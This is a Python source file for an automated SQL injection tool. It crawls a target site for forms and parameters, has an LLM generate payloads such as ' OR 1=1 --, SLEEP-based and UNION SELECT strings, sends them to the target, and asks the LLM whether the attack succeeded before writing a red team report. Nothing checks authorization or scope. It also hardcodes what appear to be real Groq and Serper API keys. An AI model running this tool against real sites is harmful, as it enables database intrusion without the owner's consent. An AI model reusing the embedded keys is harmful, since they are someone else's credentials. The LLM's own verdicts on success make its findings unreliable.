import os
import json
import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from openai import OpenAI

# ---------- CONFIG ----------
GROQ_API_KEY = os.getenv("GROQ_API_KEY") or "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"
SERPER_API_KEY = os.getenv("SERPER_API_KEY") or "98de95d9f23cfe0ee068a1ff872f3d93074f2255"  # optional

_cache = {}
client = OpenAI(base_url="https://api.groq.com/openai/v1", api_key=GROQ_API_KEY)

# ---------- 1. DISCOVER INJECTION POINTS (deterministic, no LLM) ----------
def discover_injection_points(target_url: str) -> list:
    """
    Crawls the target HTML to find forms and URL parameters.
    Returns a list of injection points: [{"method": "GET/POST", "url": "...", "data": {...}, "param": "..."}]
    """
    points = []
    try:
        resp = requests.get(target_url, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")

        # Find forms
        for form in soup.find_all("form"):
            method = form.get("method", "get").upper()
            action = form.get("action", "")
            if action.startswith("http"):
                url = action
            else:
                url = target_url.rstrip("/") + "/" + action.lstrip("/")
            inputs = form.find_all("input")
            data = {}
            for inp in inputs:
                name = inp.get("name")
                if name:
                    data[name] = ""
            if data:
                points.append({
                    "method": method,
                    "url": url,
                    "data": data,
                    "param": None
                })

        # Query parameters in the target URL
        parsed = urlparse(target_url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for key in query_params.keys():
                points.append({
                    "method": "GET",
                    "url": target_url,
                    "data": None,
                    "param": key
                })

        # If nothing found, fallback to common endpoints (still deterministic)
        if not points:
            common_endpoints = ["/login", "/admin", "/search", "/api"]
            for ep in common_endpoints:
                points.append({
                    "method": "POST",
                    "url": target_url.rstrip("/") + ep,
                    "data": {"username": "", "password": ""},
                    "param": None
                })
    except Exception as e:
        print(f"[Discovery Error]: {e}")
        # Ultimate fallback
        points.append({
            "method": "POST",
            "url": target_url,
            "data": {"username": "", "password": ""},
            "param": None
        })
    return points

# ---------- 2. SEND PAYLOAD (deterministic HTTP request) ----------
def send_payload(injection_point: dict, payload: str) -> dict:
    """
    Sends a real HTTP request with the injected payload.
    Returns: {"status_code": int, "response_text": str, "time": float, "error": None or str}
    """
    method = injection_point.get("method", "GET")
    url = injection_point["url"]
    data = injection_point.get("data")
    param = injection_point.get("param")

    try:
        if method == "GET" and param:
            parsed = urlparse(url)
            query_dict = parse_qs(parsed.query)
            query_dict[param] = payload
            new_query = urlencode(query_dict, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            start = time.time()
            resp = requests.get(new_url, timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            return {
                "status_code": resp.status_code,
                "response_text": resp.text[:2000],
                "time": elapsed,
                "error": None
            }
        elif method == "POST" and data:
            post_data = data.copy()
            for key in post_data.keys():
                post_data[key] = payload
                break
            start = time.time()
            resp = requests.post(url, data=post_data, timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            return {
                "status_code": resp.status_code,
                "response_text": resp.text[:2000],
                "time": elapsed,
                "error": None
            }
        else:
            start = time.time()
            resp = requests.get(f"{url}?q={payload}", timeout=10, allow_redirects=False)
            elapsed = time.time() - start
            return {
                "status_code": resp.status_code,
                "response_text": resp.text[:2000],
                "time": elapsed,
                "error": None
            }
    except Exception as e:
        return {
            "status_code": 0,
            "response_text": "",
            "time": 0,
            "error": str(e)
        }

# ---------- 3. AI GENERATES PAYLOADS (LLM) ----------
def ai_generate_payloads(target_url: str, vuln_type: str, num_payloads: int = 8) -> list:
    cache_key = f"payloads_{target_url}_{vuln_type}"
    if cache_key in _cache:
        return _cache[cache_key]

    prompt = f"""Generate {num_payloads} high‑impact SQL injection payloads for {target_url}. Include:
- Error‑based (e.g., ' OR 1=1 --)
- Boolean‑based (e.g., ' AND 1=1 -- and ' AND 1=2 --)
- Time‑based (e.g., ' AND SLEEP(5) --)
- UNION‑based (e.g., ' UNION SELECT null,null --)
- Obfuscated (encoding, comments)
Return ONLY a JSON array of strings. No explanation."""
    try:
        response = client.chat.completions.create(
            model="llama-3.1-8b-instant",
            messages=[
                {"role": "system", "content": "You are a security expert. Return only valid JSON."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.7
        )
        raw = response.choices[0].message.content.strip()
        start = raw.find('[')
        end = raw.rfind(']') + 1
        if start != -1 and end != 0:
            payloads = json.loads(raw[start:end])
        else:
            payloads = [raw]
        _cache[cache_key] = payloads
        return payloads
    except Exception as e:
        print(f"[AI Payload Generation Error]: {e}")
        # If LLM fails, we return an empty list – no hardcoded fallback
        return []

# ---------- 4. PURE LLM‑DRIVEN EXPLOIT (no hardcoded checks) ----------
def exploit_sqli(injection_point: dict) -> dict:
    """
    Pure LLM‑driven SQL injection test.
    - The LLM generates payloads.
    - The LLM analyzes the response.
    - No hardcoded status/error/keyword checks.
    """
    # Generate payloads via LLM
    payloads = ai_generate_payloads(injection_point["url"], "SQL Injection", num_payloads=6)
    if not payloads:
        # If LLM fails to generate, we return not vulnerable (no fallback hardcoded)
        return {"vulnerable": False, "technique": None, "extracted": None, "evidence": None}

    for payload in payloads:
        # Send real request
        resp = send_payload(injection_point, payload)
        if resp["error"]:
            continue

        # Ask LLM to analyze the response
        analysis_prompt = f"""
You are a security analyst. Determine if this HTTP response indicates a successful SQL injection attack.

Payload sent: {payload}
Status code: {resp['status_code']}
Response time: {resp['time']:.2f} seconds
Response body (truncated):
{resp['response_text'][:1500]}

Answer with a JSON object:
{{
    "success": true/false,
    "reason": "Your reasoning, based on the response content and status code",
    "confidence": "high/medium/low"
}}
"""
        try:
            analysis_response = client.chat.completions.create(
                model="llama-3.1-8b-instant",
                messages=[
                    {"role": "system", "content": "You are a security analyst. Return only valid JSON."},
                    {"role": "user", "content": analysis_prompt}
                ],
                temperature=0.0  # factual
            )
            raw = analysis_response.choices[0].message.content.strip()
            start = raw.find('{')
            end = raw.rfind('}') + 1
            if start != -1 and end != 0:
                result = json.loads(raw[start:end])
                # Only consider success if confidence is high or medium
                if result.get("success") and result.get("confidence") in ("high", "medium"):
                    return {
                        "vulnerable": True,
                        "technique": "llm_driven_sqli",
                        "extracted": None,
                        "evidence": {
                            "payload": payload,
                            "status": resp["status_code"],
                            "reason": result.get("reason"),
                            "snippet": resp["response_text"][:300]
                        }
                    }
        except Exception as e:
            print(f"LLM analysis failed: {e}")
            continue

    return {"vulnerable": False, "technique": None, "extracted": None, "evidence": None}

# ---------- 5. MAIN ORCHESTRATOR ----------
def generate_threat_analysis(target_url: str, vuln_type: str) -> str:
    """
    Main entry point – orchestrates the whole process.
    - Discovers injection points.
    - For each point, runs the pure LLM exploitation.
    - Only generates a report if a real exploit is confirmed by the LLM.
    """
    # 1. Discover injection points
    injection_points = discover_injection_points(target_url)
    if not injection_points:
        return "❌ No injection points discovered. Target may not be vulnerable or may be unreachable."

    all_exploits = []
    any_success = False

    # 2. For each injection point, run the LLM‑driven exploit
    for point in injection_points:
        if vuln_type == "SQL Injection":
            print(f"[*] Testing SQL Injection on {point['url']}...")
            result = exploit_sqli(point)
            if result["vulnerable"]:
                any_success = True
                all_exploits.append({
                    "point": point,
                    "vulnerability": "SQL Injection",
                    "technique": result["technique"],
                    "extracted": result.get("extracted"),
                    "evidence": result["evidence"]
                })
        # Add other vuln types (BAC, SSRF) here later

    # 3. Generate report based on real results
    if any_success:
        # Real vulnerability found – generate detailed report via LLM
        prompt = f"""Write a detailed red team report.

Vulnerability: {vuln_type}
Target: {target_url}

Successful Exploits:
{json.dumps(all_exploits, indent=2)}

Include:
1. Executive summary
2. Attack vector explanation
3. Successful payloads (with evidence)
4. Impact assessment
5. Remediation steps
"""
        try:
            response = client.chat.completions.create(
                model="llama-3.1-8b-instant",
                messages=[
                    {"role": "system", "content": "You are a senior security consultant. Write professional red team reports."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.3
            )
            report = response.choices[0].message.content.strip()
        except Exception as e:
            report = f"✅ Exploit successful but report generation failed: {e}"
    else:
        # No vulnerability found – honest response
        report = f"""❌ No vulnerabilities found for {vuln_type} on {target_url}.

Injection points tested: {len(injection_points)}
Status: The target appears secure against this attack vector.

Recommendation: Consider manual testing for more complex vulnerabilities."""

    # Store result for status check (used by main.py)
    global _last_exploit_success
    _last_exploit_success = any_success
    return report

# ---------- GLOBAL STATUS ----------
_last_exploit_success = False

def get_last_exploit_success():
    """Returns whether the last exploitation attempt succeeded."""
    return _last_exploit_success